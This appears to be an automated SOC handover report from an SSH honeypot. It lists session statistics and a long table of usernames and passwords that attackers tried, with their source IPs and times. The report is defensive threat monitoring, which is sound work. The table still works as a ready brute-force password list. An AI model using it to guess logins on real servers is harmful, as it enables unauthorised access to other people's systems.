# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-19 |
| **Generated At** | 2026-09-19T22:17:04Z |
| **Shift Time** | 22:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **255** |
| Confirmed Threats | **244** |
| False Positives Filtered | **11** (4.3%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **33** |
| High Severity Cases | **145** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **110** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **435** |
| Unique Credential Pairs | **361** |
| Unique Usernames | **55** |
| Unique Passwords | **333** |
| Successful Auth Pairs | **402** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 301 |
| `345gs5662d34` | 28 |
| `support` | 9 |
| `admin` | 9 |
| `dolphinscheduler` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `` | 18 |
| `support` | 9 |
| `123456` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `` | 18 |
| `support` | `support` | 9 |
| `root` | `3245gs5662d34` | 6 |
| `admin` | `3245gs5662d34` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Tech@2024` | `10.0.0.73` | 2026-09-19T16:55:42 |
| `root` | `passw0rd` | `10.0.0.73` | 2026-09-19T16:55:53 |
| `root` | `123456aA` | `10.0.0.73` | 2026-09-19T16:57:33 |
| `root` | `pass123$` | `10.0.0.73` | 2026-09-19T16:57:48 |
| `root` | `qaz123wsx` | `10.0.0.73` | 2026-09-19T16:59:26 |
| `root` | `ASDasd123` | `10.0.0.73` | 2026-09-19T16:59:44 |
| `root` | `` | `23.94.206.233` | 2026-09-19T17:00:49 |
| `root` | `oscar@1234` | `10.0.0.73` | 2026-09-19T17:01:17 |
| `support` | `support` | `10.0.0.73` | 2026-09-19T17:01:19 |
| `root` | `asd.123@` | `10.0.0.73` | 2026-09-19T17:01:38 |
| `root` | `Piyush@123` | `10.0.0.73` | 2026-09-19T17:03:08 |
| `root` | `admin2016` | `10.0.0.73` | 2026-09-19T17:03:35 |
| `root` | `dbadmin@123` | `10.0.0.73` | 2026-09-19T17:04:58 |
| `root` | `admin@2013` | `10.0.0.73` | 2026-09-19T17:05:37 |
| `root` | `Password@2025` | `10.0.0.73` | 2026-09-19T17:06:47 |
| `root` | `Admin2010` | `10.0.0.73` | 2026-09-19T17:07:34 |
| `root` | `Technology@2023` | `10.0.0.73` | 2026-09-19T17:08:37 |
| `root` | `admin123#` | `10.0.0.73` | 2026-09-19T17:09:29 |
| `root` | `Hello` | `10.0.0.73` | 2026-09-19T17:10:29 |
| `root` | `abc#123` | `10.0.0.73` | 2026-09-19T17:11:26 |
| `root` | `afra@net` | `10.0.0.73` | 2026-09-19T17:12:19 |
| `root` | `Adm!n@1234` | `10.0.0.73` | 2026-09-19T17:14:09 |
| `root` | `a123456*` | `10.0.0.73` | 2026-09-19T17:15:25 |
| `root` | `oracle@123` | `10.0.0.73` | 2026-09-19T17:16:00 |
| `root` | `1qaz2WSX` | `10.0.0.73` | 2026-09-19T17:17:20 |
| `root` | `Allah786` | `10.0.0.73` | 2026-09-19T17:17:50 |
| `root` | `@1234@` | `10.0.0.73` | 2026-09-19T17:19:18 |
| `root` | `user2@2024` | `10.0.0.73` | 2026-09-19T17:19:39 |
| `support` | `support` | `39.40.182.175` | 2026-09-19T17:20:49 |
| `root` | `user.123` | `10.0.0.73` | 2026-09-19T17:21:11 |
| `root` | `Allen@123` | `10.0.0.73` | 2026-09-19T17:21:28 |
| `root` | `test123+` | `10.0.0.73` | 2026-09-19T17:23:08 |
| `root` | `admin@12` | `10.0.0.73` | 2026-09-19T17:23:20 |
| `tddcongestion` | `tddcongestion` | `10.0.0.73` | 2026-09-19T17:24:24 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-19T17:24:28 |
| `tddcongestion` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T17:24:30 |
| `root` | `Server2012` | `10.0.0.73` | 2026-09-19T17:25:05 |
| `root` | `Black@123` | `10.0.0.73` | 2026-09-19T17:25:10 |
| `tddcongestion` | `tddcongestion` | `101.36.119.203` | 2026-09-19T17:26:23 |
| `345gs5662d34` | `345gs5662d34` | `101.36.119.203` | 2026-09-19T17:26:27 |
| `tddcongestion` | `3245gs5662d34` | `101.36.119.203` | 2026-09-19T17:26:29 |
| `root` | `seadoo` | `10.0.0.73` | 2026-09-19T17:26:57 |
| `root` | `kafka@1234` | `10.0.0.73` | 2026-09-19T17:27:05 |
| `root` | `qwe123@` | `10.0.0.73` | 2026-09-19T17:28:53 |
| `root` | `lokesh@123` | `10.0.0.73` | 2026-09-19T17:29:02 |
| `root` | `QAZwsx123` | `10.0.0.73` | 2026-09-19T17:30:45 |
| `root` | `openvpn@123` | `10.0.0.73` | 2026-09-19T17:30:52 |
| `root` | `qaz123` | `10.0.0.73` | 2026-09-19T17:32:35 |
| `root` | `u@123` | `10.0.0.73` | 2026-09-19T17:32:44 |
| `root` | `q@123456` | `10.0.0.73` | 2026-09-19T17:34:27 |
| `root` | `1Qaz2wsx3e` | `10.0.0.73` | 2026-09-19T17:34:34 |
| `root` | `P@$$w0rD` | `10.0.0.73` | 2026-09-19T17:36:20 |
| `root` | `Password@1234` | `10.0.0.73` | 2026-09-19T17:36:25 |
| `root` | `p@SSW0RD` | `10.0.0.73` | 2026-09-19T17:38:11 |
| `root` | `vps@2025` | `10.0.0.73` | 2026-09-19T17:38:15 |
| `root` | `Pa$$word1` | `10.0.0.73` | 2026-09-19T17:40:03 |
| `root` | `System@2025` | `10.0.0.73` | 2026-09-19T17:40:05 |
| `admin` | `password1!` | `106.251.244.178` | 2026-09-19T17:40:20 |
| `345gs5662d34` | `345gs5662d34` | `106.251.244.178` | 2026-09-19T17:40:23 |
| `admin` | `3245gs5662d34` | `106.251.244.178` | 2026-09-19T17:40:25 |
| `support` | `support` | `176.53.159.196` | 2026-09-19T17:41:19 |
| `root` | `Pa$$w0rd2012` | `10.0.0.73` | 2026-09-19T17:41:55 |
| `root` | `Qwert.12345` | `10.0.0.73` | 2026-09-19T17:41:58 |
| `root` | `Pa$$w0rd123` | `10.0.0.73` | 2026-09-19T17:43:47 |
| `root` | `Test1234!` | `10.0.0.73` | 2026-09-19T17:43:48 |
| `frappe` | `frappe123!` | `211.75.198.217` | 2026-09-19T17:45:24 |
| `345gs5662d34` | `345gs5662d34` | `211.75.198.217` | 2026-09-19T17:45:28 |
| `frappe` | `3245gs5662d34` | `211.75.198.217` | 2026-09-19T17:45:29 |
| `root` | `private` | `10.0.0.73` | 2026-09-19T17:45:36 |
| `root` | `Password2014` | `10.0.0.73` | 2026-09-19T17:45:37 |
| `ec2-user` | `Aa123456` | `82.77.62.250` | 2026-09-19T17:45:52 |
| `345gs5662d34` | `345gs5662d34` | `82.77.62.250` | 2026-09-19T17:45:54 |
| `ec2-user` | `3245gs5662d34` | `82.77.62.250` | 2026-09-19T17:45:55 |
| `root` | `Asdf@123` | `10.0.0.73` | 2026-09-19T17:47:26 |
| `root` | `password123` | `10.0.0.73` | 2026-09-19T17:47:28 |
| `frappe` | `frappe123!` | `98.70.50.166` | 2026-09-19T17:48:16 |
| `345gs5662d34` | `345gs5662d34` | `98.70.50.166` | 2026-09-19T17:48:19 |
| `frappe` | `3245gs5662d34` | `98.70.50.166` | 2026-09-19T17:48:21 |
| `root` | `Tech@123` | `10.0.0.73` | 2026-09-19T17:49:19 |
| `root` | `Pass12345` | `10.0.0.73` | 2026-09-19T17:49:20 |
| `root` | `123!P@ssw0rd` | `10.0.0.73` | 2026-09-19T17:51:09 |
| `root` | `Mm6066mg` | `10.0.0.73` | 2026-09-19T17:51:10 |
| `root` | `Web@123` | `10.0.0.73` | 2026-09-19T17:53:01 |
| `root` | `Mm123456` | `10.0.0.73` | 2026-09-19T17:53:02 |
| `root` | `Qwerty@123` | `10.0.0.73` | 2026-09-19T17:54:53 |
| `root` | `@dmin2015` | `10.0.0.73` | 2026-09-19T17:54:54 |
| `root` | `A12345678a` | `10.0.0.73` | 2026-09-19T17:56:41 |
| `root` | `diamond1` | `10.0.0.73` | 2026-09-19T17:56:45 |
| `root` | `1` | `92.118.39.77` | 2026-09-19T17:57:29 |
| `root` | `name@123` | `10.0.0.73` | 2026-09-19T17:58:33 |
| `root` | `diamond12` | `10.0.0.73` | 2026-09-19T17:58:36 |
| `root` | `` | `94.154.43.69` | 2026-09-19T17:59:13 |
| `root` | `12` | `92.118.39.77` | 2026-09-19T17:59:25 |
| `root` | `Abcdefgh1234` | `10.0.0.73` | 2026-09-19T18:00:20 |
| `root` | `diamond123` | `10.0.0.73` | 2026-09-19T18:00:28 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-19T18:01:39 |
| `root` | `vps2024` | `10.0.0.73` | 2026-09-19T18:02:15 |
| `root` | `diamond.1` | `10.0.0.73` | 2026-09-19T18:02:20 |
| `root` | `shubham` | `10.0.0.73` | 2026-09-19T18:04:05 |
| `root` | `diamond.12` | `10.0.0.73` | 2026-09-19T18:04:17 |
| `root` | `User@2025` | `10.0.0.73` | 2026-09-19T18:05:54 |
| `root` | `diamond.123` | `10.0.0.73` | 2026-09-19T18:06:17 |
| `root` | `@dmin` | `10.0.0.73` | 2026-09-19T18:07:45 |
| `root` | `diamond...123` | `10.0.0.73` | 2026-09-19T18:08:14 |
| `root` | `passwd` | `10.0.0.73` | 2026-09-19T18:09:34 |
| `root` | `diamond@1` | `10.0.0.73` | 2026-09-19T18:10:12 |
| `root` | `Rocky@123` | `10.0.0.73` | 2026-09-19T18:11:22 |
| `root` | `diamond@12` | `10.0.0.73` | 2026-09-19T18:12:07 |
| `root` | `P@ssw0rd#123` | `10.0.0.73` | 2026-09-19T18:13:14 |
| `root` | `diamond@123` | `10.0.0.73` | 2026-09-19T18:14:05 |
| `root` | `apple123` | `10.0.0.73` | 2026-09-19T18:15:04 |
| `root` | `diamond!` | `10.0.0.73` | 2026-09-19T18:16:04 |
| `root` | `dev#2025` | `10.0.0.73` | 2026-09-19T18:16:56 |
| `root` | `diamond!@` | `10.0.0.73` | 2026-09-19T18:17:59 |
| `root` | `Password147` | `10.0.0.73` | 2026-09-19T18:18:46 |
| `root` | `diamond!@#` | `10.0.0.73` | 2026-09-19T18:19:54 |
| `root` | `alpine` | `10.0.0.73` | 2026-09-19T18:20:38 |
| `root` | `!Q@W#E$R%T` | `10.0.0.73` | 2026-09-19T18:20:39 |
| `root` | `` | `160.119.66.206` | 2026-09-19T18:20:57 |
| `root` | `diamond2010` | `10.0.0.73` | 2026-09-19T18:21:52 |
| `root` | `1234@1234` | `10.0.0.73` | 2026-09-19T18:22:28 |
| `root` | `diamond2011` | `10.0.0.73` | 2026-09-19T18:23:48 |
| `root` | `user2025` | `10.0.0.73` | 2026-09-19T18:24:18 |
| `bitrix` | `qwe123qwe` | `51.77.158.34` | 2026-09-19T18:25:19 |
| `345gs5662d34` | `345gs5662d34` | `51.77.158.34` | 2026-09-19T18:25:21 |
| `bitrix` | `3245gs5662d34` | `51.77.158.34` | 2026-09-19T18:25:22 |
| `root` | `diamond2013` | `10.0.0.73` | 2026-09-19T18:27:44 |
| `root` | `deploy@123` | `10.0.0.73` | 2026-09-19T18:28:00 |
| `root` | `diamond2014` | `10.0.0.73` | 2026-09-19T18:29:42 |
| `root` | `Admin123@` | `10.0.0.73` | 2026-09-19T18:29:48 |
| `ubnt` | `ubnt123` | `80.94.95.118` | 2026-09-19T18:31:03 |
| `root` | `diamond2015` | `10.0.0.73` | 2026-09-19T18:31:38 |
| `root` | `P4ssw0rd!@#` | `10.0.0.73` | 2026-09-19T18:31:38 |
| `root` | `dspace@2025` | `10.0.0.73` | 2026-09-19T18:33:30 |
| `root` | `diamond2016` | `10.0.0.73` | 2026-09-19T18:33:32 |
| `root` | `Abcd!234` | `61.155.106.101` | 2026-09-19T18:34:13 |
| `root` | `Pass.123` | `10.0.0.73` | 2026-09-19T18:35:21 |
| `root` | `diamond2017` | `10.0.0.73` | 2026-09-19T18:35:29 |
| `root` | `data2025` | `10.0.0.73` | 2026-09-19T18:37:11 |
| `root` | `diamond2018` | `10.0.0.73` | 2026-09-19T18:37:29 |
| `root` | `poiuyt` | `10.0.0.73` | 2026-09-19T18:39:03 |
| `root` | `diamond2019` | `10.0.0.73` | 2026-09-19T18:39:27 |
| `root` | `passer` | `10.0.0.73` | 2026-09-19T18:40:54 |
| `root` | `` | `10.0.0.73` | 2026-09-19T18:41:11 |
| `root` | `d!am0nd` | `10.0.0.73` | 2026-09-19T18:41:30 |
| `root` | `P@ssw0rd.123` | `10.0.0.73` | 2026-09-19T18:42:46 |
| `root` | `Diamond1` | `10.0.0.73` | 2026-09-19T18:43:27 |
| `root` | `ADMIN123` | `10.0.0.73` | 2026-09-19T18:44:37 |
| `root` | `Diamond12` | `10.0.0.73` | 2026-09-19T18:45:25 |
| `root` | `` | `80.94.95.118` | 2026-09-19T18:45:42 |
| `root` | `Lucas@123` | `10.0.0.73` | 2026-09-19T18:46:29 |
| `root` | `Diamond123` | `10.0.0.73` | 2026-09-19T18:47:26 |
| `root` | `Qwerty!123` | `10.0.0.73` | 2026-09-19T18:48:18 |
| `root` | `Diamond.1` | `10.0.0.73` | 2026-09-19T18:49:22 |
| `root` | `linux` | `10.0.0.73` | 2026-09-19T18:50:11 |
| `root` | `Diamond.12` | `10.0.0.73` | 2026-09-19T18:51:22 |
| `root` | `` | `77.90.185.17` | 2026-09-19T18:51:24 |
| `root` | `Drs123` | `10.0.0.73` | 2026-09-19T18:52:03 |
| `root` | `Diamond.123` | `10.0.0.73` | 2026-09-19T18:53:17 |
| `root` | `asdasd123` | `10.0.0.73` | 2026-09-19T18:53:52 |
| `root` | `------fuck------` | `10.0.0.73` | 2026-09-19T18:53:57 |
| `root` | `Diamond...123` | `10.0.0.73` | 2026-09-19T18:55:17 |
| `root` | `Admin123.` | `10.0.0.73` | 2026-09-19T18:55:42 |
| `root` | `Diamond@1` | `10.0.0.73` | 2026-09-19T18:57:16 |
| `root` | `admin@888` | `10.0.0.73` | 2026-09-19T18:57:34 |
| `root` | `Diamond@12` | `10.0.0.73` | 2026-09-19T18:59:14 |
| `root` | `praxis` | `10.0.0.73` | 2026-09-19T18:59:25 |
| `root` | `Yn123456` | `41.216.167.226` | 2026-09-19T18:59:32 |
| `345gs5662d34` | `345gs5662d34` | `41.216.167.226` | 2026-09-19T18:59:35 |
| `root` | `3245gs5662d34` | `41.216.167.226` | 2026-09-19T18:59:36 |
| `root` | `Yn123456` | `172.87.30.117` | 2026-09-19T19:01:03 |
| `345gs5662d34` | `345gs5662d34` | `172.87.30.117` | 2026-09-19T19:01:05 |
| `root` | `3245gs5662d34` | `172.87.30.117` | 2026-09-19T19:01:06 |
| `root` | `Diamond@123` | `10.0.0.73` | 2026-09-19T19:01:09 |
| `root` | `ftpuser123!` | `10.0.0.73` | 2026-09-19T19:01:15 |
| `me` | `123456` | `14.225.207.152` | 2026-09-19T19:02:06 |
| `345gs5662d34` | `345gs5662d34` | `14.225.207.152` | 2026-09-19T19:02:10 |
| `me` | `3245gs5662d34` | `14.225.207.152` | 2026-09-19T19:02:12 |
| `kit` | `123456` | `49.247.37.22` | 2026-09-19T19:02:18 |
| `345gs5662d34` | `345gs5662d34` | `49.247.37.22` | 2026-09-19T19:02:22 |
| `kit` | `3245gs5662d34` | `49.247.37.22` | 2026-09-19T19:02:23 |
| `root` | `master#2025` | `10.0.0.73` | 2026-09-19T19:03:05 |
| `root` | `Diamond!` | `10.0.0.73` | 2026-09-19T19:03:07 |
| `sunil` | `sunil123` | `182.48.68.82` | 2026-09-19T19:04:07 |
| `345gs5662d34` | `345gs5662d34` | `182.48.68.82` | 2026-09-19T19:04:12 |
| `sunil` | `3245gs5662d34` | `182.48.68.82` | 2026-09-19T19:04:14 |
| `root` | `xxx` | `10.0.0.73` | 2026-09-19T19:04:57 |
| `root` | `Diamond!@` | `10.0.0.73` | 2026-09-19T19:05:05 |
| `root` | `mama1234` | `172.160.227.37` | 2026-09-19T19:06:23 |
| `345gs5662d34` | `345gs5662d34` | `172.160.227.37` | 2026-09-19T19:06:25 |
| `root` | `3245gs5662d34` | `172.160.227.37` | 2026-09-19T19:06:26 |
| `root` | `!Admin1234` | `10.0.0.73` | 2026-09-19T19:06:46 |
| `root` | `Diamond!@#` | `10.0.0.73` | 2026-09-19T19:07:06 |
| `root` | `admin#1` | `10.0.0.73` | 2026-09-19T19:08:38 |
| `root` | `Diamond2010` | `10.0.0.73` | 2026-09-19T19:09:06 |
| `root` | `Abc123654` | `10.0.0.73` | 2026-09-19T19:10:30 |
| `solana` | `solana` | `195.178.110.218` | 2026-09-19T19:10:34 |
| `root` | `Diamond2011` | `10.0.0.73` | 2026-09-19T19:11:07 |
| `ubuntu` | `ubuntu` | `195.178.110.218` | 2026-09-19T19:12:10 |
| `root` | `rootroot` | `10.0.0.73` | 2026-09-19T19:12:21 |
| `root` | `Diamond2012` | `10.0.0.73` | 2026-09-19T19:13:02 |
| `sol` | `sol` | `195.178.110.218` | 2026-09-19T19:13:40 |
| `root` | `P@ss12345` | `10.0.0.73` | 2026-09-19T19:14:19 |
| `root` | `Diamond2013` | `10.0.0.73` | 2026-09-19T19:14:59 |
| `ubuntu` | `123456` | `195.178.110.218` | 2026-09-19T19:15:07 |
| `root` | `Sec@123` | `10.0.0.73` | 2026-09-19T19:16:09 |
| `root` | `Diamond2014` | `10.0.0.73` | 2026-09-19T19:16:56 |
| `sol` | `sol123` | `195.178.110.218` | 2026-09-19T19:17:10 |
| `root` | `Secure@123` | `10.0.0.73` | 2026-09-19T19:18:00 |
| `root` | `Diamond2015` | `10.0.0.73` | 2026-09-19T19:18:53 |
| `daoperator` | `daoperator` | `195.178.110.218` | 2026-09-19T19:19:10 |
| `root` | `india@123` | `10.0.0.73` | 2026-09-19T19:19:49 |
| `root` | `Diamond2016` | `10.0.0.73` | 2026-09-19T19:20:54 |
| `admin` | `admin` | `195.178.110.218` | 2026-09-19T19:21:04 |
| `ftp_user` | `ftp_pass` | `182.253.156.184` | 2026-09-19T19:21:35 |
| `root` | `changeme` | `10.0.0.73` | 2026-09-19T19:21:39 |
| `345gs5662d34` | `345gs5662d34` | `182.253.156.184` | 2026-09-19T19:21:39 |
| `ftp_user` | `3245gs5662d34` | `182.253.156.184` | 2026-09-19T19:21:41 |
| `root` | `Diamond2017` | `10.0.0.73` | 2026-09-19T19:22:50 |
| `root` | `Support2025` | `10.0.0.73` | 2026-09-19T19:23:30 |
| `administrator` | `administrator` | `195.178.110.218` | 2026-09-19T19:24:05 |
| `root` | `Diamond2018` | `10.0.0.73` | 2026-09-19T19:24:51 |
| `root` | `test2024@` | `10.0.0.73` | 2026-09-19T19:25:20 |
| `root` | `12345678` | `195.178.110.218` | 2026-09-19T19:26:17 |
| `root` | `Diamond2019` | `10.0.0.73` | 2026-09-19T19:26:53 |
| `root` | `12qwaszx` | `10.0.0.73` | 2026-09-19T19:27:10 |
| `root` | `eve` | `195.178.110.218` | 2026-09-19T19:28:31 |
| `root` | `D!am0nd` | `10.0.0.73` | 2026-09-19T19:28:51 |
| `root` | `Pa$$word` | `10.0.0.73` | 2026-09-19T19:28:59 |
| `root` | `challenger1` | `10.0.0.73` | 2026-09-19T19:30:46 |
| `scylla` | `scylla` | `195.178.110.218` | 2026-09-19T19:30:47 |
| `root` | `rootadmin` | `10.0.0.73` | 2026-09-19T19:30:52 |
| `root` | `Admin!234` | `10.0.0.73` | 2026-09-19T19:32:39 |
| `root` | `challenger12` | `10.0.0.73` | 2026-09-19T19:32:43 |
| `nobara` | `nobara` | `195.178.110.218` | 2026-09-19T19:32:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.232` | 2026-09-19T19:33:36 |
| `root` | `Exchange@123` | `10.0.0.73` | 2026-09-19T19:34:28 |
| `root` | `challenger123` | `10.0.0.73` | 2026-09-19T19:34:41 |
| `noc` | `noc` | `195.178.110.218` | 2026-09-19T19:35:00 |
| `root` | `Server01` | `10.0.0.73` | 2026-09-19T19:36:20 |
| `root` | `challenger.1` | `10.0.0.73` | 2026-09-19T19:36:37 |
| `nic` | `nic123` | `195.178.110.218` | 2026-09-19T19:37:02 |
| `pool` | `123456` | `10.0.0.73` | 2026-09-19T19:37:40 |
| `ovpn` | `ovpn` | `10.0.0.73` | 2026-09-19T19:37:43 |
| `pool` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T19:37:43 |
| `ovpn` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T19:37:53 |
| `root` | `@dmin2025*` | `10.0.0.73` | 2026-09-19T19:38:11 |
| `storage` | `storage` | `10.0.0.73` | 2026-09-19T19:38:26 |
| `storage` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T19:38:31 |
| `root` | `challenger.12` | `10.0.0.73` | 2026-09-19T19:38:35 |
| `cosmos` | `cosmos` | `195.178.110.218` | 2026-09-19T19:38:40 |
| `root` | `root123!@#` | `10.0.0.73` | 2026-09-19T19:40:00 |
| `mail` | `mail` | `195.178.110.218` | 2026-09-19T19:40:04 |
| `root` | `challenger.123` | `10.0.0.73` | 2026-09-19T19:40:31 |
| `root` | `Beijing123` | `10.0.0.73` | 2026-09-19T19:40:54 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T19:41:00 |
| `root` | `zabbix123!` | `10.0.0.73` | 2026-09-19T19:41:54 |
| `smtp` | `smtp587` | `195.178.110.218` | 2026-09-19T19:42:14 |
| `root` | `challenger!` | `10.0.0.73` | 2026-09-19T19:42:32 |
| `root` | `ironman` | `10.0.0.73` | 2026-09-19T19:43:45 |
| `root` | `challenger!@` | `10.0.0.73` | 2026-09-19T19:44:27 |
| `zebra` | `zebra` | `195.178.110.218` | 2026-09-19T19:44:28 |
| `root` | `1234abc` | `10.0.0.73` | 2026-09-19T19:45:37 |
| `elastic` | `elastic!@#` | `195.178.110.218` | 2026-09-19T19:46:14 |
| `root` | `challenger!@#` | `10.0.0.73` | 2026-09-19T19:46:26 |
| `root` | `Telecom123` | `10.0.0.73` | 2026-09-19T19:47:28 |
| `root` | `challenger!1` | `10.0.0.73` | 2026-09-19T19:48:26 |
| `elastic` | `elastic@123` | `195.178.110.218` | 2026-09-19T19:48:30 |
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-19T19:48:31 |
| `root` | `passw0rd6` | `10.0.0.73` | 2026-09-19T19:49:20 |
| `root` | `challenger!1@2` | `10.0.0.73` | 2026-09-19T19:50:30 |
| `john` | `john!@` | `195.178.110.218` | 2026-09-19T19:50:46 |
| `root` | `!2#4%6&8` | `10.0.0.73` | 2026-09-19T19:51:10 |
| `office` | `office` | `195.178.110.218` | 2026-09-19T19:52:12 |
| `root` | `challenger!1@2#3` | `10.0.0.73` | 2026-09-19T19:52:31 |
| `root` | `Admin.123` | `10.0.0.73` | 2026-09-19T19:52:58 |
| `grafana` | `grafana` | `195.178.110.218` | 2026-09-19T19:54:18 |
| `root` | `challenger@1` | `10.0.0.73` | 2026-09-19T19:54:25 |
| `root` | `qwe123!@#` | `10.0.0.73` | 2026-09-19T19:54:50 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-19T19:55:22 |
| `root` | `challenger@12` | `10.0.0.73` | 2026-09-19T19:56:21 |
| `telegraf` | `telegraf` | `195.178.110.218` | 2026-09-19T19:56:34 |
| `root` | `nexus2025` | `10.0.0.73` | 2026-09-19T19:56:43 |
| `root` | `challenger@123` | `10.0.0.73` | 2026-09-19T19:58:18 |
| `root` | `localadmin` | `10.0.0.73` | 2026-09-19T19:58:31 |
| `ubuntu` | `ubuntu/rpFQjq2YGZLw=k-7D` | `195.178.110.218` | 2026-09-19T19:58:46 |
| `root` | `Challenger1` | `10.0.0.73` | 2026-09-19T20:00:16 |
| `root` | `Changeme_123` | `10.0.0.73` | 2026-09-19T20:00:23 |
| `price` | `price` | `10.0.0.73` | 2026-09-19T20:00:54 |
| `price` | `3245gs5662d34` | `10.0.0.73` | 2026-09-19T20:00:57 |
| `ubuntu` | `rpFQjq2YGZLw=k-7D` | `195.178.110.218` | 2026-09-19T20:01:04 |
| `root` | `1qaz@WSX!@#` | `10.0.0.73` | 2026-09-19T20:01:58 |
| `root` | `Challenger12` | `10.0.0.73` | 2026-09-19T20:02:12 |
| `root` | `nagios2024` | `10.0.0.73` | 2026-09-19T20:02:16 |
| `root` | `==0` | `195.178.110.218` | 2026-09-19T20:03:20 |
| `root` | `sistemas` | `10.0.0.73` | 2026-09-19T20:04:05 |
| `root` | `Challenger123` | `10.0.0.73` | 2026-09-19T20:04:09 |
| `root` | `==0==` | `195.178.110.218` | 2026-09-19T20:05:28 |
| `root` | `Admin2025` | `10.0.0.73` | 2026-09-19T20:05:55 |
| `root` | `Challenger.1` | `10.0.0.73` | 2026-09-19T20:06:05 |
| `root` | `======` | `195.178.110.218` | 2026-09-19T20:07:38 |
| `root` | `Servidor@123` | `10.0.0.73` | 2026-09-19T20:07:46 |
| `root` | `Challenger.12` | `10.0.0.73` | 2026-09-19T20:08:03 |
| `root` | `server2022` | `10.0.0.73` | 2026-09-19T20:09:35 |
| `root` | `=1-203948576` | `195.178.110.218` | 2026-09-19T20:09:56 |
| `root` | `Challenger.123` | `10.0.0.73` | 2026-09-19T20:10:00 |
| `root` | `123mudar` | `10.0.0.73` | 2026-09-19T20:11:25 |
| `root` | `Challenger!` | `10.0.0.73` | 2026-09-19T20:11:56 |
| `root` | `1=2-30495867` | `195.178.110.218` | 2026-09-19T20:12:11 |
| `root` | `q1w2e3R$` | `10.0.0.73` | 2026-09-19T20:13:14 |
| `root` | `Challenger!@` | `10.0.0.73` | 2026-09-19T20:13:57 |
| `elasticsearch` | `elasticsearch` | `195.178.110.218` | 2026-09-19T20:14:34 |
| `root` | `123@123` | `10.0.0.73` | 2026-09-19T20:15:07 |
| `root` | `Challenger!@#` | `10.0.0.73` | 2026-09-19T20:15:55 |
| `dolphinscheduler` | `dolphinscheduler` | `195.178.110.218` | 2026-09-19T20:16:13 |
| `root` | `x` | `10.0.0.73` | 2026-09-19T20:16:56 |
| `dolphinscheduler` | `12345678` | `195.178.110.218` | 2026-09-19T20:17:46 |
| `root` | `Challenger!1` | `10.0.0.73` | 2026-09-19T20:17:56 |
| `root` | `2wsxxsw2` | `10.0.0.73` | 2026-09-19T20:18:46 |
| `root` | `Challenger!1@2` | `10.0.0.73` | 2026-09-19T20:19:54 |
| `dolphinscheduler` | `123456` | `195.178.110.218` | 2026-09-19T20:20:03 |
| `root` | `soporte` | `10.0.0.73` | 2026-09-19T20:20:36 |
| `dolphinscheduler` | `123321` | `195.178.110.218` | 2026-09-19T20:21:36 |
| `root` | `Challenger!1@2#3` | `10.0.0.73` | 2026-09-19T20:21:53 |
| `root` | `admin12345678` | `10.0.0.73` | 2026-09-19T20:22:26 |
| `dolphinscheduler` | `123123123` | `195.178.110.218` | 2026-09-19T20:23:16 |
| `root` | `Challenger@1` | `10.0.0.73` | 2026-09-19T20:23:49 |
| `root` | `123asd123` | `10.0.0.73` | 2026-09-19T20:24:13 |
| `dolphinscheduler` | `dolphinscheduler@123` | `195.178.110.218` | 2026-09-19T20:25:07 |
| `root` | `admin12345#` | `10.0.0.73` | 2026-09-19T20:26:04 |
| `git` | `gitgitgit` | `195.178.110.218` | 2026-09-19T20:26:44 |
| `root` | `Challenger@123` | `10.0.0.73` | 2026-09-19T20:27:46 |
| `root` | `Sistemas123` | `10.0.0.73` | 2026-09-19T20:27:55 |
| `user` | `123456` | `195.178.110.218` | 2026-09-19T20:28:49 |
| `root` | `asdf` | `10.0.0.73` | 2026-09-19T20:29:41 |
| `root` | `mudar123` | `10.0.0.73` | 2026-09-19T20:29:48 |
| `user` | `111111` | `195.178.110.218` | 2026-09-19T20:30:28 |
| `felix` | `pass` | `45.117.177.47` | 2026-09-19T20:31:03 |
| `345gs5662d34` | `345gs5662d34` | `45.117.177.47` | 2026-09-19T20:31:07 |
| `felix` | `3245gs5662d34` | `45.117.177.47` | 2026-09-19T20:31:09 |
| `root` | `@dm1n` | `10.0.0.73` | 2026-09-19T20:31:34 |
| `root` | `admin@2012` | `10.0.0.73` | 2026-09-19T20:31:40 |
| `node` | `node` | `195.178.110.218` | 2026-09-19T20:32:24 |
| `root` | `Temp2017` | `10.0.0.73` | 2026-09-19T20:33:25 |
| `root` | `admin12345` | `10.0.0.73` | 2026-09-19T20:33:30 |
| `admin` | `admin123` | `195.178.110.218` | 2026-09-19T20:34:25 |
| `root` | `q1w2e3r4` | `10.0.0.73` | 2026-09-19T20:35:16 |
| `root` | `Admin12#` | `10.0.0.73` | 2026-09-19T20:35:28 |
| `test` | `q1w2e3r4` | `195.178.110.218` | 2026-09-19T20:36:06 |
| `root` | `ubuntu` | `171.244.199.25` | 2026-09-19T20:36:08 |
| `root` | `sysadmin2025` | `10.0.0.73` | 2026-09-19T20:37:03 |
| `root` | `abc123#` | `10.0.0.73` | 2026-09-19T20:37:28 |
| `admin` | `hadoop12345678` | `175.198.62.180` | 2026-09-19T20:38:12 |
| `345gs5662d34` | `345gs5662d34` | `175.198.62.180` | 2026-09-19T20:38:16 |
